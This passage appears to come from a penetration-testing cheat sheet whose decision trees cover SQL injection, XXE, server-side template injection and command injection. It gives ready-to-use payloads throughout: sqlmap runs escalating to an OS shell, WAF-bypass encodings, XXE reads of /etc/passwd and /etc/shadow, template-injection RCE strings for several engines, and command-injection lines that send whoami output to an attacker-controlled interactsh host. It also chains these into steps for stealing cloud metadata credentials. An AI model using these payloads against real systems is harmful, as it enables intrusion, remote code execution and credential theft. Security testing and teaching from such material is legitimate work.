## Injection (SQLi, XXE, SSTI, Command Injection)

### SQL Injection

- `->` **[Primary Probe]** Run `sqlmap -u "https://target/api/item?id=1" --headers="Authorization: Bearer <tok>" --level=5 --risk=3 --batch --random-agent --dbs` against all integer/UUID params captured in Burp history [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11405427/)
  - `->` **[Signal: Error-based response / time delay]** → Confirm with `--technique=BEUSTQ`, dump schema with `--tables`, escalate to `--os-shell` if MySQL + FILE privilege
  - `->` **[Dead End: WAF blocks union/error payloads]** → Try `--tamper=charunicodeescape,between,space2comment` — inline comment bypass: `SELECT/**/1`; hex-encode strings: `0x61646d696e`
  - `->` **[Dead End: Numeric param hardened]** → Pivot to JSON body: `{"id": "1 OR SLEEP(5)--"}` — many ORMs pass JSON fields unsanitized to raw queries [ijmir](https://www.ijmir.com/v2i6/2.php)
  - `->` **[Dead End: No async response timing]** → Force second-order: register username `admin'--` → trigger profile-fetch endpoint → observe DB error on downstream query
  - `->` **[Data Chaining]** Leaked `db_user` with FILE priv → attempt `/etc/passwd` read → leaked hostname → new SSRF target

### XXE (XML External Entity)

- `->` **[Primary Probe]** Intercept any XML-body request (SOAP, file-upload parsers, RSS import). Inject:
  ```xml
  <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
  ```
  - `->` **[Signal: File contents echoed]** → Escalate to `file:///proc/self/environ`, `/proc/net/fib_trie` for internal IPs
  - `->` **[Dead End: No inline echo]** → Blind XXE via OOB: `<!ENTITY % dtd SYSTEM "http://<interactsh-host>/x.dtd">` — capture DNS/HTTP ping via interactsh-client [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11012433/)
  - `->` **[Dead End: External entities disabled]** → Try XInclude: `<xi:include href="file:///etc/passwd"/>` in any nested XML element; also test SVG upload (`<svg><image href="file:///etc/shadow"/></svg>`)
  - `->` **[Dead End: Parser rejects external]** → Error-based XXE: craft malformed DTD to trigger descriptive exception leaking path info
  - `->` **[Data Chaining]** OOB DNS confirms parser reachability → exfiltrate `/etc/hosts` → discover internal hostnames → seed SSRF attack surface

### SSTI (Server-Side Template Injection)

- `->` **[Primary Probe]** Inject `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}` into all user-controlled reflection points (name fields, email subject, PDF generators, error messages)
  - `->` **[Signal: `49` reflected]** → Engine fingerprint via `tplmap -u "https://target/page?name=INJECT"` → RCE chain per engine:
    - Jinja2: `{{''.__class__.__mro__ [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11405427/).__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}`
    - Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
    - Pebble: `{% for i in range(0, 1) %}{{i.getClass().forName('java.lang.Runtime').getMethod('exec',''.class).invoke(...)}}{% endfor %}`
  - `->` **[Dead End: Math not evaluated]** → Try logic operators: `{{'a'*10}}`, Smarty: `{php}echo `id`;{/php}`, Mako: `${self.module.cache.util.os.system('id')}`
  - `->` **[Dead End: WAF blocks curly braces]** → Unicode brace variants: `\u007b\u007b7*7\u007d\u007d`; try encoding through URL, base64 decode gadget in template
  - `->` **[Data Chaining]** Confirmed SSTI RCE → read AWS metadata from `169.254.169.254` → IAM role creds → escalate to S3 bucket enumeration

### Command Injection

- `->` **[Primary Probe]** Inject `; id`, `` `id` ``, `$(id)`, `| id` into filename params, ping/traceroute fields, image conversion inputs, report generators
  - `->` **[Signal: `uid=` in response]** → Escalate: `$(curl http://<interactsh>/$(whoami))` for blind OOB
  - `->` **[Dead End: Semicolon/pipe blocked]** → Try newline injection: `%0aid`, `%0a%0did`; IFS bypass: `i$IFS}d`
  - `->` **[Dead End: All special chars stripped]** → Encoded polyglot: `1%26%26id%261` (URL double-encode), or chain via file write: write cron payload via unrestricted upload then trigger
  - `->` **[Dead End: Async process — no output]** → DNS OOB: `` `host $(id).attacker.interactsh.com` `` captured via interactsh-client [ieeexplore.ieee](https://ieeexplore.ieee.org/document/11376817/)

***

## Broken Access Control (IDOR, Privilege Escalation, CORS)
